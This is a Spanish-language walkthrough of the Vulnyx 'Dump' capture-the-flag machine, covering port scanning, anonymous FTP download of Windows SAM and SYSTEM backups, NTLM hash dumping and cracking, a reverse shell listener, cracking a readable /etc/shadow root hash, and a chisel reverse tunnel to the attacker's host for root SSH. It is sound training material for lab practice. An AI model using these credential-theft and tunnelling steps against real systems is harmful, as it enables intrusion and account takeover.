---
icon: flag
---

# Dump Vulnyx (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-19 03:27 EDT
Nmap scan report for 192.168.5.84
Host is up (0.00061s latency).

PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      pyftpdlib 1.5.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 192.168.5.84:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx   2 root     root         4096 Feb 09  2024 .backup [NSE: writeable]
80/tcp   open  http     Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
4200/tcp open  ssl/http ShellInABox
|_http-title: Shell In A Box
| ssl-cert: Subject: commonName=dump
| Not valid before: 2024-02-09T11:53:57
|_Not valid after:  2044-02-04T11:53:57
|_ssl-date: TLS randomness does not represent time
MAC Address: 08:00:27:2F:9A:CF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.52 seconds
```

Veremos varias cosas interesantes entre ellas un `FTP` que vemos de primeras que el modo `anonimo` si se puede loguear, por lo que vamos a intentar iniciar sesion.

## FTP

```shell
ftp anonymous@<IP>
```

Info:

```
229 Entering extended passive mode (|||35789|).
125 Data connection already open. Transfer starting.
drwxrwxrwx   2 root     root         4096 Feb 09  2024 .backup
226 Transfer complete.
```

Si listamos veremos que hay un `.backup` de directorio, si entramos dentro veremos dos archivos que seran los siguientes:

```shell
cd .backup
ls -la
```

Info:

```
229 Entering extended passive mode (|||41389|).
125 Data connection already open. Transfer starting.
-rwxrwxrwx   1 root     root        24576 Feb 09  2024 sam.bak
-rwxrwxrwx   1 root     root      3264512 Feb 09  2024 system.bak
226 Transfer complete.
```

Vemos que son dos archivos relacionados con las tipicas claves que nos podemos encontrar en un `windows` para poder extraer los `hashes` `NTLM` de dicho `windows`, por lo que dentro tiene que haber cosas interesantes.

```shell
get sam.bak
get system.bak
```

Una vez que nos lo hayamos descargado, vamos a extraer dichos `hashes`.

```shell
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x042145cf7279c87791fa907cd6d9bccd
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:45ab968b011c0b6cfd1e9e1b30ff40cc:916da1881680fcb38f2ce951f666d6be:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:d0d506281c0dbfe0a16f57e412411d37:::
dumper:1004:ebd1b59f4f5a6843aad3b435b51404ee:7324322d85d3714068d67eccee442365:::
admin:1005:7cc48b08335cd858aad3b435b51404ee:556a8f7773e850d4cf4d789d39ddaca0:::
[*] Cleaning up...
```

Veremos que lo hemos extraido de forma correcta, por lo que vamos a crear un archivo con dicho `hash` para poder intentar crackearlo.

> hash

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
dumper:1004:ebd1b59f4f5a6843aad3b435b51404ee:7324322d85d3714068d67eccee442365:::
admin:1005:7cc48b08335cd858aad3b435b51404ee:556a8f7773e850d4cf4d789d39ddaca0:::
```

Ahora vamos a utilizar `john` para intentar `crackearlo` de esta forma:

```shell
john --format=NT --wordlist=<WORDLIST> hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 3 password hashes with no different salts (NT [MD4 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=6
Press 'q' or Ctrl-C to abort, almost any other key for status
blabla           (admin)     
                 (Administrator)     
1dumper          (dumper)     
3g 0:00:00:00 DONE (2025-08-19 03:51) 25.00g/s 19485Kp/s 19485Kc/s 19540KC/s 1ejem..1doxie
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed.
```

Veremos que ha funcionado la mayoria, por lo que vamos a guardarnos dichas credenciales por si las tuvieramos que utilizar en un futuro.

Vamos a investigar el puerto `80` a ver que vemos ahi dentro, pero no veremos nada interesante, ahora si probamos a entrar al puerto `4200` que desde el `nmap` vimos que era como una especie de `webshell` en la propia pagina, veremos un error si entramos asi:

```
URL = http://<IP>:4200/
```

Pero en el reporte de `nmap` veremos que utiliza `SSL` por lo que tendremos que poner `HTTPS` de esta forma:

```
URL = https://<IP>:4200/
```

Con esto si nos aparecera como una terminal en la propia web, vamos a probar a utilizar los usuarios y contraseñas que descubrimos anteriormente.

```
User: dumper
Pass: 1dumper
```

Info:

```
Linux dump 4.19.0-26-amd64 #1 SMP Debian 4.19.304-1 (2024-01-09) x86_64            
dumper@dump:~$ whoami                                                              
dumper
```

Con esto veremos que estaremos dentro vamos a realizar una `reverse shell` para tener una mejor `shell`.

```shell
```

Antes de enviarla vamos a ponernos a la escucha.

```shell
nc -lvnp <PORT>
```

Ahora si enviamos lo anterior y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.50] from (UNKNOWN) [192.168.5.84] 38774
dumper@dump:~$ whoami
whoami
dumper
```

Vamos a sanitizar la `shell` de la siguiente forma:

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Ahora vamos a leer la `flag` del usuario.

> user.txt

```
cfbe86765c16e9bf8ddc3739f4f270a9
```

## Escalate Privileges

Si enumeramos un poco el sistema podremos ver lo siguiente:

```shell
ls -la /etc/shadow
```

Info:

```
-rw-r--r-- 1 root shadow 974 feb  9  2024 /etc/shadow
```

Veremos que podemos leer el archivo `shadow`, si lo leemos veremos lo siguiente:

```
root:$6$jzcdBmCLz0zF2.b/$6sok07AjDc3TN3oeI/NqrdZ6NSQly3ADW6lvs3z5q.5GDqsCypL8WtL7ARhzDcdYgukakXWeNbiIP7GyigCse/:19762:0:99999:7:::
daemon:*:18898:0:99999:7:::
bin:*:18898:0:99999:7:::
sys:*:18898:0:99999:7:::
sync:*:18898:0:99999:7:::
games:*:18898:0:99999:7:::
man:*:18898:0:99999:7:::
lp:*:18898:0:99999:7:::
mail:*:18898:0:99999:7:::
news:*:18898:0:99999:7:::
uucp:*:18898:0:99999:7:::
proxy:*:18898:0:99999:7:::
www-data:*:18898:0:99999:7:::
backup:*:18898:0:99999:7:::
list:*:18898:0:99999:7:::
irc:*:18898:0:99999:7:::
gnats:*:18898:0:99999:7:::
nobody:*:18898:0:99999:7:::
_apt:*:18898:0:99999:7:::
systemd-timesync:*:18898:0:99999:7:::
systemd-network:*:18898:0:99999:7:::
systemd-resolve:*:18898:0:99999:7:::
messagebus:*:18898:0:99999:7:::
sshd:*:18898:0:99999:7:::
systemd-coredump:!!:18898::::::
dumper:$6$8sDPsnEu5ZBa8bgE$EqxYjZuAYVmAqbusMGgx.NmwUwx0UcSVe2Z/YTRk1DqBOnxFxNbot7ktfzYxNALw8iDKXrkfV5.e54uTMgr371:19762:0:99999:7:::
shellinabox:*:19762:0:99999:7:::
```

Vemos que nos ha dejado, por lo que vamos a probar a `crackear` el `hash` del usuario `root`.

> hash.root

```
root:$6$jzcdBmCLz0zF2.b/$6sok07AjDc3TN3oeI/NqrdZ6NSQly3ADW6lvs3z5q.5GDqsCypL8WtL7ARhzDcdYgukakXWeNbiIP7GyigCse/:19762:0:99999:7:::
```

Ahora si lo intentamos `crackear` veremos lo siguiente:

```shell
john --format=crypt --wordlist=<WORDLISTS> hash.root
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 6 for all loaded hashes
Cost 2 (algorithm specific iterations) is 5000 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
shadow123        (root)     
1g 0:00:00:02 DONE (2025-08-19 04:04) 0.4830g/s 3942p/s 3942c/s 3942C/s weston..kaiden
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Veremos que lo hemos conseguido, pero si volvemos a la maquina a realizar el `su` para escalar al usuario `root` veremos que no nos deja, pero si investigamos un poco veremos el siguiente puerto.

```shell
ss -tuln
```

Info:

```
Netid            State             Recv-Q            Send-Q                       Local Address:Port                       Peer Address:Port            
udp              UNCONN            0                 0                                  0.0.0.0:68                              0.0.0.0:*               
tcp              LISTEN            0                 100                                0.0.0.0:21                              0.0.0.0:*               
tcp              LISTEN            0                 128                              127.0.0.1:22                              0.0.0.0:*               
tcp              LISTEN            0                 128                                0.0.0.0:4200                            0.0.0.0:*               
tcp              LISTEN            0                 128                                      *:80                                    *:*
```

Veremos algo interesante y es que hay un `SSH` de forma local, pero si probamos a conectarnos de forma local por `SSH` veremos que no nos deja, por lo que vamos a utilizar `chisel` para exponerlo a nuestra maquina `host`.

URL = [Download Chisel GitHub](https://github.com/jpillora/chisel)

Ahora lo instalaremos de esta forma en nuestra maquina `host`.

```shell
go install github.com/jpillora/chisel@latest
```

Y haremos lo siguiente en dicha maquina:

```shell
chisel server -p 8000 --reverse
```

Desde la maquina `victima` esto otro:

```shell
cd /tmp
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
chmod +x chisel_1.9.1_linux_amd64
./chisel_1.9.1_linux_amd64 client <IP_ATTACKER>:8000 R:2222:127.0.0.1:22
```

Info (VICTIMA):

```
2025/08/19 10:25:57 client: Connecting to ws://192.168.5.50:8000
2025/08/19 10:25:57 client: Connected (Latency 2.867261ms)
```

Info (ATTACKER):

```
2025/08/19 04:16:00 server: Reverse tunnelling enabled
2025/08/19 04:16:00 server: Fingerprint NWSrKq19+/1bJLz5QUix+DiY2DwE7DGyis59k5LzuYo=
2025/08/19 04:16:00 server: Listening on http://0.0.0.0:8000
2025/08/19 04:25:56 server: session#1: Client version (1.9.1) differs from server version (0.0.0-src)
2025/08/19 04:25:56 server: session#1: tun: proxy#R:2222=>22: Listening
```

Veremos que ha funcionado todo de forma correcta, ahora vamos a conectarnos de esta forma por `SSH` con las credenciales de `root`.

```shell
ssh root@127.0.0.1 -p 2222
```

Metemos como contraseña `shadow123`...

Info:

```
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[127.0.0.1]:2222' (ED25519) to the list of known hosts.
root@127.0.0.1's password: 
Linux dump 4.19.0-26-amd64 #1 SMP Debian 4.19.304-1 (2024-01-09) x86_64
root@dump:~# whoami
root
```

Con esto veremos que ya estaremos dentro, por lo que leeremos la `flag` de `root`.

> root.txt

```
60c60f8e926b65a55bf8bd6239bb616d
```
